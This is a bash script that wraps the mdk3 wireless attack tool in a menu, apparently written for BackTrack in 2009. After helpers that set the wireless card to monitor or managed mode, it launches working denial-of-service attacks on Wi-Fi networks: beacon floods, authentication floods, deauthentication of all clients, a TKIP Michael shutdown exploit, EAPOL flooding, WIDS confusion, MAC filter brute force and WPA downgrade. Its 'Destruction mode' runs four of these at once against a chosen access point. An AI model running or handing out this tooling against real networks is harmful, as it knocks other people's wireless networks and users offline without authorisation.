#!/bin/bash
clear

trap killing INT
#zelena
function echoMessage() {
  tput setaf 2; tput setab 0;
  echo $*
  tput sgr0
}

function killing() {
  tput setaf 2; tput setab 0;
  clear
  echoError "============================================Exit properly using Menu!!!============================================="
  echo ""
  tput sgr0
  menu_fcia
}

#hneda
function echoWarning() {
  tput setaf 3; tput setab 0;
  echo $*
  tput sgr0
}

#modra
function echoPrompt() {
  tput setaf 4; tput setab 0;
  echo $*
  tput sgr0
}

#cervena
function echoError() {
  tput setaf 1; tput setab 0;
  echo $*
  tput sgr0
}

function monitor() {
ifconfig $WIFI up
iwconfig $WIFI rate 1M
airmon-ng start $WIFI
sleep 2
}

atheros() {
echoPrompt "Should I put ath0 in monitor mode? (y/n) "
echoMessage "(n means you want to switch to Managed mode!)"
read answer
if [ "$answer" != "n" ]
then wlanconfig ath0 destroy
wlanconfig ath0 create wlandev wifi0 wlanmode monitor
iwconfig ath0 rate 1M
clear
echo
echo
echoError "Switching to mode Monitor, rate 1M"
echo
else
wlanconfig ath0 destroy
wlanconfig ath0 create wlandev wifi0 wlanmode Managed
clear
echo
echo
echoError "Switching to mode Managed!"
echo
fi
}

airmon() {
echoPrompt "Should I put wireless card in monitor mode? (y/n) "
echoMessage "(n means you want to switch to mode Managed!)"
read answer
if [ "$answer" != "n" ]
then airmon-ng start $WIFI
iwconfig $WIFI rate 1M
clear
echo
echo
echoError "Switching to mode Monitor, rate 1M!"
echo
else
airmon-ng stop $WIFI
clear
echo
echo
echoError "Switching to mode Managed!"
echo
fi
}

function intel() {
echoPrompt "Should I put wireless card in monitor mode? (y/n) "
echoMessage "(n means you want to switch to mode Managed!)"
read answer
if [ "$answer" != "n" ]
then 
ifconfig $WIFI down
iwconfig $WIFI mode Monitor
ifconfig $WIFI up
iwconfig $WIFI rate 1M
clear
echo
echo
echoError "Switching to mode Monitor, rate 1M!"
else
ifconfig $WIFI down
iwconfig $WIFI mode Managed
ifconfig $WIFI up
clear
echo
echo
echoError "Switching to mode Managed!"
echo
fi
}

function setinterface() {
	
	INTERFACES=`ip link|egrep "^[0-9]+"|cut -d ':' -f 2 |awk {'print $1'} |grep -v lo`
	
	echoError "===============================================Interface selection======================================================"
	echoMessage "______Select your interface:______"
        echo
        select WIFI in $INTERFACES; do
                break;
		done
echo
             echo "========================================================================================================================"                
}
		

function managed() {
iwconfig $WIFI mode Managed
iwconfig $WIFI rate 1M
}

function restartiface() {
ifconfig $WIFI down
ifconfig $WIFI up
iwconfig $WIFI rate 1M
}


#Beacon flood
function flood () {
xterm -bd red -geometry 80x24+100+100 -T Fake_AP_session_started -e mdk3 $WIFI b -n $destruct_essid -c $destruct_chan -s 500 -g -$destruct_enc
}
#Auth-DoS
function dos () { 
xterm -bd red -geometry 80x24+400+400 -T AUTH_flood_session_started -e mdk3 $WIFI a -i $destruct_bssid
}
#Amok mode
function amok () {
xterm -bd red -geometry 80x24+700+700 -T Amok_Mode_session_started -e mdk3 $WIFI d -t $destruct_bssid -c $destruct_chan
}
#WIDS confusion 
function wids () {
xterm -bd red -geometry 80x24+1000+1000 -T WIDS/WIPS/WDS_Confusion_session_started -e mdk3 $WIFI w -e $destruct_essid -c $destruct_chan -z
}

function iwconfigcia () {
xterm +j -sb -rightbar -bd yellow -geometry 80x24+350+350 -T Status_window -hold -e iwconfig $WIFI 
}

function scantarget () { 
ifconfig $WIFI up
iwlist $WIFI scan > /root/Desktop/target_list.txt
echoError "Target list was created on your Desktop (target_list.txt) You may proceed to monitor/managed mode switching... "
echo

}




       echo "======================================================================================================================="
echoMessage "__________________________________________Airstorm script for MDK3 v.5_________________________________________________"
  echoError "____________________________________________ Developed for BackTrack __________________________________________________"
#sleep 3
#      echo "======================================================================================================================="
echo
       echo "================================================== FINISH HIM! ========================================================"
#sleep 3


menu_fcia () 
  {
        #clear
	echoPrompt "Menu - Enter your choice:"
	choice=17
        echo
        
        echoPrompt "____________________________________________________________"
	echo "0  Managed mode target scan-list of targets will be created"
        echoError "____________________________________________________________"
        echo "1. Monitor/Managed mode switcher-only for Atheros cards!"
        echo "2. Monitor/Managed mode switcher using airmon-ng!" 
        echo "3. Monitor/Managed mode switcher-should work for Intel cards!"
        echoError "____________________________________________________________"
        
        echo "4.  Beacon Flood Mode" 
	echo "5.  Authentication DoS mode" 
	echo "6.  Basic probing and ESSID Bruteforce mode" 
        echo "7.  Deauthentication / Disassociation Amok Mode" 
        echo "8.  Michael shutdown exploitation (TKIP)" 
        echo "9.  802.1X tests"
        echo "10. WIDS/WIPS Confusion" 
        echo "11. MAC filter bruteforce mode " 
        echo "12. WPA Downgrade test "
        echoError "____________________________________________________________"
        echo "13. Destruction Mode!" 
        echoError "____________________________________________________________"
        echo "14. MDK3 help"
        
        echo "15. iwconfig-this is only for info..."
        echo "16. Exit Airstorm script"

echoMessage "========================================================O_O============================================================="
read choice
  
if [ $choice -eq 0 ];
     then
     echo
     echo
     
     scantarget
     menu_fcia

else if [ $choice -eq 1 ];
     then
     atheros
     menu_fcia

else if [ $choice -eq 2 ];
     then
     airmon
     menu_fcia

else if [ $choice -eq 3 ];
     then
     echo
     echo
     
echoError "This often set the requested Mode but crashes the script, simply run miron.sh again and skip Monitor/Managed mode switching!"
     intel
     menu_fcia

else if [ $choice -eq 4 ];
     then
     echoError "Sends beacon frames to show fake APs at clients. Sends beacon frames to show fake APs at clients. This can sometimes crash network scanners and even drivers!" 
     echo     
     echoPrompt "Type SSID:"
     read ssid
     echoPrompt "Choose channel (1-14):"
     read chan
     echoPrompt "Set encryption, type d for Ad-Hoc, w for Wep, g for Wpa-TKIP, a for Wpa-AES."
    read setcrypt
     echoError "Creating .."
     
     echo
     mdk3 $WIFI b -n $ssid -c $chan -s 500 -$setcrypt
     menu_fcia 
  
else if [ $choice -eq 5 ];
     then
     echoError "Sends authentication frames to all APs found in range. Too much clients freeze or reset almost every AP."
    echo
    echo "Set MAC address of your target:"
    read maci
    echoMessage "Starting..."
    mdk3 $WIFI a -i $maci  
    menu_fcia

    else if [ $choice -eq 6 ];
    then
    echo "Basic probing and ESSID Bruteforce mode" 
    echoMessage "Probes AP and check for answer, useful for checking if SSID has been correctly decloaked or if AP is in your adaptors sending range"
    echo
    echoPrompt "Set target BSSID"
    read brutebssid
    echo
    echoPrompt "Set channel"
    read brutchan
    echo
    echoMessage "Starting hiden SSID bruteforce..."
    mdk3 $WIFI p -b -t $brutebssid -c $brutchan
    echo
    menu_fcia

else if [ $choice -eq 7 ];
     then  
     echoError "Deauthentication / Disassociation Amok Mode - Kicks everybody found from AP"
     echoPrompt "Type target BSSID, example: 00:11:22:33:44:55"
     read tar
     echo
     echoPrompt "Set channel"
     read kanalosss
     echoError "Kicking..."
     mdk3 $WIFI d -t $tar -c $kanalosss 
     menu_fcia

     else if [ $choice -eq 8 ];
     then  
     echoError "Michael shutdown exploitation (TKIP) - Cancels all traffic continuously"
     echo
     echoPrompt "Set target BSSID"
     read michbssid
     echo
     echoError "Using the new TKIP QoS-Exploit, Needs just a few packets to shut AP down!"
     mdk3 $WIFI m -t $michbssid -j
     menu_fcia

     else if [ $choice -eq 9 ];
     then 
     echoError "802.1X tests - Only EAPOL packet flooding is implemented"
     echo
     echoPrompt "Set target ESSID"
     read eapolessid
     echoPrompt "Set target BSSID"
     read eapolbssid
     mdk3 $WIFI x 0 -n $eapolessid -t $eapolbssid
     menu_fcia

     else if [ $choice -eq 10 ];
     then
     echoError "WIDS/WIPS/WDS Confusion Confuses a WDS with multi-authenticated clients which messes up routing tables"
     echo
     echoPrompt "Set target ESSID"
     read taressid
     echo
     echoPrompt "Set target channel"
     read kanalik
     echoError "Starting WIDS/WIPS Confusion, activating Zero_Chaos' WIDS exploit!"
     mdk3 $WIFI w -e $taressid -c $kanalik -z
     menu_fcia


     else if [ $choice -eq 11 ];
     then 
     echoError "MAC filter bruteforce mode This test uses a list of known client MAC Adresses and tries to authenticate them to the given AP while dynamically changing
      its response timeout for best performance. It currently works only
      on APs who deny an open authentication request properly" 
     echoPrompt "Set target BSSID"
     read tarbrut
     echoError "Starting..."
     mdk3 $WIFI f -t $tarbrut
     menu_fcia
  
     else if [ $choice -eq 12 ];
     then 
     echo "WPA Downgrade test - deauthenticates Stations and APs sending WPA encrypted packets. With this test you can check if the sysadmin will try setting his network to WEP or disable encryption"
     echoPrompt "Set target BSSID"
     read targetaka
     echo
     echoError "Starting..."
     mdk3 $WIFI g -t $targetaka 

     menu_fcia
     
     else if [ $choice -eq 13 ];
     then
     clear
            echoError "_____________________________________________Accessing Destruction mode!________________________________________________" 
     echoMessage      "=======================================================O_o=============================================================="
     echoError        "___________________________________________Be carefull, this is dangerous!______________________________________________"
echo
echoPrompt "Fill me with neccessary info please:"
    echo
    echoMessage "Set target SSID!"
    read destruct_essid
    echo
    echoMessage "Set target BSSID!"
    read destruct_bssid
    echo
    echoMessage "Set encryption!"
    echo "Type d for Ad-Hoc, w for Wep, g for Wpa-TKIP, a for Wpa-AES."
    read destruct_enc
    echo
    echoMessage "Set channel!"
    read destruct_chan     
    echo
echoError "Starting destruction mode O_o"
      wids & dos & amok & flood
    
menu_fcia
#_________________________________________________________________________________________________________________________________     
     
     else if [ $choice -eq 14 ];
     then
     clear
     mdk3 --fullhelp
     menu_fcia

     else if [ $choice -eq 15 ];
     then 
     clear
     echo
     echoMessage "Showing iwconfig in a xterm..."
     echo
     echo
     echoError "Close Status_window to continue!"
     echo 
     echo
     iwconfigcia
     menu_fcia
    
     else if [ $choice -eq 16 ];
     then     
     sleep 1
     echoMessage - Bourne again shell script, Created 11.5.2009 o 02:45 by MI1 - Sajonara!
              echo "========================================================================================================================="
              
              date
              uname -a
              exit

 #else 
 #echoWarning -n "No valid choice was choosen "
 #choice=15
 #menu_fcia         
                    
                  fi
                   fi                    
                     fi
                       fi
                          fi
                             fi
                                fi
                                   fi
                                     fi
                                       fi 
                                          fi
                                            fi
                                               fi
                                                 fi
                                                   fi
                                                     fi
                                                       fi

}
setinterface               
menu_fcia


